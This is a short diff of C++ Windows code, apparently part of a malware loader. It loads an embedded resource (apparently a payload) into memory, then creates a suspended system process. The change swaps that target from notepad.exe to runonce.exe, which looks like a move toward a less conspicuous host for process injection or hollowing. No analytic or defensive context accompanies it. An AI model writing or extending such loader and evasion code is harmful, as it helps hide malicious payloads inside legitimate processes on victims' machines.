@@ -34,11 +34,12 @@ int main() {
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
 
     // Create a new process in a suspended stat
+    std::string path = "C:\\Windows\\System32\\runonce.exe";
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess(path.c_str(), NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
 
     
